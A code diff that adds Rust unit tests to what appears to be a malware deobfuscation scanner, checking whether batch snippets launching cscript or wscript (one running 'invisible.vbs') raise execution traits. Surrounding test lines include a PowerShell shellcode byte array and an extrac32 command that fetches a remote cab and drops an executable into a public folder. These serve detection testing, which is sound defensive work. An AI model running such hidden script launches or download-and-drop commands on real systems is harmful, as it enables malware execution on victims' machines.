@@ -3356,6 +3356,60 @@ powershell $shellcode = @(0xfc,0x48,0x83,0xe4,0xf0)"#;
     }
 
     #[test]
+    fn script_host_invocation_in_deob_text_emits_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"for /f "delims=" %%I in ('cscript /nologo "%~f0?.wsf" script.bat "%~2"') do set "%~1=%%I""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CscriptExec { src } if src == "%~f0?.wsf"
+            )),
+            "deob-text cscript invocation did not emit CscriptExec: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn conditional_wscript_invocation_in_deob_text_emits_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"if exist CPU.bat (wscript.exe invisible.vbs CPU.bat)"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WscriptExec { src } if src == "invisible.vbs"
+            )),
+            "deob-text wscript invocation did not emit WscriptExec: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn script_host_prose_in_deob_text_does_not_emit_exec_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"' Checks if this script is running under cscript.exe
+if InStrRev(LCase(WScript.FullName), "cscript.exe", -1) <> 0 then"#,
+            &mut env,
+        );
+
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| { matches!(t, Trait::CscriptExec { .. } | Trait::WscriptExec { .. }) }),
+            "prose/comment cscript mention emitted script-host trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_extrac32_text_does_not_emit_extrac32_trait() {
         let script =
             br#"echo keep ^& extrac32 /Y /C http://example.com/a.cab C:\Users\Public\a.exe"#;
